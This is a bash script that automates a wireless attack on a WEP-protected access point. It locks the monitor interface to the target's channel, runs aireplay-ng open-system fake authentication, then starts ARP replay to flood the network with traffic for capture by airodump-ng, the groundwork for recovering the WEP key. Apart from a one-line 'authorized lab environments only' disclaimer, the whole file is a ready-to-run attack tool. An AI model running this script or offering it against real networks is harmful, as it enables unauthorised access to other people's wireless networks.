#!/usr/bin/env bash
# wep_traffic.sh
# Last Edited by Charles Duoto on November 16, 2026
# Generate traffic on a quiet WEP network: open-system fake auth + ARP replay.
# Pure bash. airodump-ng must be running (locked to the channel) in another terminal.
# Authorized lab environments only.
#
# Usage:
#   sudo ./wep_traffic.sh <monitor_interface> <ap_mac> <channel>
# Example:
#   sudo ./wep_traffic.sh wlan0 60:C3:97:F6:3E:BA 6

set -euo pipefail

if [[ $# -ne 3 ]]; then
    echo "Usage: $0 <monitor_interface> <ap_mac> <channel>"
    echo "Example: $0 wlan0 60:C3:97:F6:3E:BA 6"
    echo
    echo "Start airodump-ng first (in another terminal):"
    echo "  airodump-ng --bssid <ap_mac> --channel <channel> --write capture wlan0"
    exit 1
fi

IFACE="$1"
AP_MAC="$2"
CHANNEL="$3"

# Get our adapter MAC
OUR_MAC=""
if [[ -f "/sys/class/net/$IFACE/address" ]]; then
    OUR_MAC=$(cat "/sys/class/net/$IFACE/address" 2>/dev/null || true)
fi
if [[ -z "$OUR_MAC" ]]; then
    OUR_MAC=$(ip link show "$IFACE" 2>/dev/null | grep -oE '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | head -1 || true)
fi
if [[ -z "$OUR_MAC" ]]; then
    echo "[-] Could not determine MAC of $IFACE"
    exit 1
fi

echo "[*] WEP traffic generator"
echo "[*] Interface : $IFACE ($OUR_MAC)"
echo "[*] Target AP : $AP_MAC  (channel $CHANNEL)"
echo
echo "[!] Make sure airodump-ng is already running and locked to this BSSID/channel."
echo

# Lock channel
echo "[*] Setting channel $CHANNEL..."
iwconfig "$IFACE" channel "$CHANNEL" 2>/dev/null || iw dev "$IFACE" set channel "$CHANNEL" 2>/dev/null || true

echo "[*] Step 1: Open-system fake authentication..."
# -o 1 = open system only (avoids shared-key challenge failures)
timeout 8 aireplay-ng --fakeauth 0 -o 1 -a "$AP_MAC" -h "$OUR_MAC" "$IFACE" || true

echo
echo "[*] Step 2: ARP replay..."
echo "[*] Press Ctrl+C to stop."
aireplay-ng --arpreplay -b "$AP_MAC" -h "$OUR_MAC" "$IFACE"
